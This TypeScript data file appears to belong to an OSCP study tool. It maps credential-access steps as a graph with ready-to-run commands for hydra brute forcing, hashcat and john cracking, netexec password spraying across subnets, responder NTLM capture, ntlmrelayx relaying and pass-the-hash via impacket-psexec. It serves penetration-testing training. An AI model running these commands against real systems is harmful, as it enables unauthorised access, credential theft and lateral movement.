import type { OscpContent } from '@/types/oscp'

/** Phase: credential access - brute forcing, cracking, and reuse. */
const passwords: OscpContent = {
    nodes: [
        {
            id: 'hydra-brute',
            title: 'Online brute force (hydra)',
            type: 'technique',
            phase: 'passwords',
            os: 'agnostic',
            description:
                'Targeted online guessing against a login. Prefer a known user + a small, relevant wordlist. On AD, check the lockout policy first - spraying beats brute forcing.',
            commands: [
                {
                    label: 'SSH / FTP / SMB / RDP',
                    code: `hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<target>
hydra -L users.txt -P rockyou.txt ftp://<target>`,
                },
                {
                    label: 'HTTP POST form',
                    code: `hydra -l admin -P rockyou.txt <target> http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"`,
                },
            ],
            tags: ['hydra', 'bruteforce', 'ssh', 'http-post-form'],
        },
        {
            id: 'hash-to-crack',
            title: 'Hashes in hand',
            type: 'finding',
            phase: 'passwords',
            os: 'agnostic',
            description:
                'You dumped hashes (DB, /etc/shadow, SAM, Kerberos). Identify the type, then crack offline.',
            tags: ['hash', 'ntlm', 'shadow', 'kerberos'],
        },
        {
            id: 'hash-id',
            title: 'Identify the hash + mode',
            type: 'technique',
            phase: 'passwords',
            os: 'agnostic',
            description:
                'Pick the right hashcat/john mode. Common: 0 MD5, 1000 NTLM, 1800 sha512crypt ($6$), 3200 bcrypt, 5600 NetNTLMv2, 13100 Kerberoast (TGS), 18200 AS-REP.',
            commands: [
                {
                    label: 'Identify + convert',
                    code: `hashid '<hash>'
# file-based hashes -> john format:
ssh2john id_rsa > id_rsa.hash
zip2john secret.zip > zip.hash`,
                },
            ],
            tags: ['hashid', 'hashcat-mode', 'john', '2john'],
        },
        {
            id: 'hashcat-crack',
            title: 'Crack offline (hashcat/john)',
            type: 'technique',
            phase: 'passwords',
            os: 'agnostic',
            description:
                'Straight wordlist first, then rules. rockyou + best64 cracks most OSCP hashes.',
            commands: [
                {
                    label: 'Wordlist + rules',
                    code: `hashcat -m <mode> hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m <mode> hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule`,
                },
            ],
            tags: ['hashcat', 'john', 'rockyou', 'rules'],
        },
        {
            id: 'user-list',
            title: 'Username list built',
            type: 'finding',
            phase: 'passwords',
            os: 'agnostic',
            description:
                'You have plausible usernames (from SNMP, LDAP, RID cycling, a web app, or /etc/passwd). Validate them, then spray one password across all.',
            tags: ['users', 'usernames', 'rid', 'spray'],
        },
        {
            id: 'creds-found',
            title: 'Valid credentials in hand',
            type: 'state',
            phase: 'passwords',
            os: 'agnostic',
            description:
                'The pivot point of most boxes. Reuse creds everywhere: every service, every host. In AD, one user password often opens WinRM/RDP/SMB elsewhere. Always spray reused creds across the whole subnet.',
            commands: [
                {
                    label: 'Spray/validate across hosts (netexec)',
                    code: `netexec smb <subnet>/24 -u <user> -p <pass>
netexec winrm <target> -u <user> -p <pass>
netexec ssh <target> -u <user> -p <pass>`,
                    note: '"Pwn3d!" on SMB = local admin -> dump SAM / lateral.',
                },
            ],
            tags: ['credentials', 'reuse', 'netexec', 'spray', 'pivot'],
        },
        {
            id: 'netntlm-captured',
            title: 'NetNTLMv2 captured',
            type: 'finding',
            phase: 'passwords',
            os: 'windows',
            description:
                'You coerced authentication to your host (responder, xp_dirtree, a UNC link). Either crack it offline (hashcat -m 5600) or relay it to another host that lacks SMB signing.',
            commands: [
                {
                    label: 'Capture then crack',
                    code: `sudo responder -I tun0
hashcat -m 5600 netntlm.txt rockyou.txt`,
                },
                {
                    label: 'Relay (no cracking)',
                    code: 'impacket-ntlmrelayx -tf targets.txt -smb2support',
                },
            ],
            tags: ['netntlmv2', 'responder', 'relay', 'ntlmrelayx'],
        },
        {
            id: 'pass-the-hash',
            title: 'Pass-the-Hash',
            type: 'technique',
            phase: 'passwords',
            os: 'windows',
            description:
                'An NTLM hash authenticates without cracking. Reuse it against SMB/WinRM/MSSQL. A local-admin hash that is shared across hosts opens the whole subnet.',
            commands: [
                {
                    label: 'PtH with netexec / impacket',
                    code: `netexec smb <target> -u Administrator -H <NTLM-hash>
impacket-psexec -hashes :<NTLM-hash> Administrator@<target>`,
                },
            ],
            tags: ['pth', 'ntlm', 'psexec', 'lateral'],
        },
    ],
    edges: [
        { from: 'hydra-brute', to: 'creds-found', label: 'password guessed' },
        { from: 'hash-to-crack', to: 'hash-id', label: 'identify first' },
        { from: 'hash-id', to: 'hashcat-crack', label: 'mode chosen' },
        { from: 'hashcat-crack', to: 'creds-found', label: 'cracked' },
        { from: 'user-list', to: 'ad-password-spray', label: 'spray one password (AD)' },
        { from: 'user-list', to: 'hydra-brute', label: 'brute a service' },
        { from: 'netntlm-captured', to: 'hash-to-crack', label: 'crack -m 5600' },
        { from: 'netntlm-captured', to: 'creds-found', label: 'relay = SYSTEM' },
        { from: 'creds-found', to: 'foothold-linux', label: 'SSH login' },
        { from: 'creds-found', to: 'foothold-windows', label: 'RDP / WinRM login' },
        { from: 'creds-found', to: 'ad-password-spray', label: 'spray across the domain' },
        { from: 'creds-found', to: 'winrm-lateral', label: 'valid on another host' },
        { from: 'creds-found', to: 'pass-the-hash', label: 'have the hash, not the pw' },
        { from: 'pass-the-hash', to: 'foothold-windows', label: 'PtH -> shell' },
        { from: 'pass-the-hash', to: 'psexec-lateral', label: 'admin hash -> lateral' },
    ],
}

export default passwords
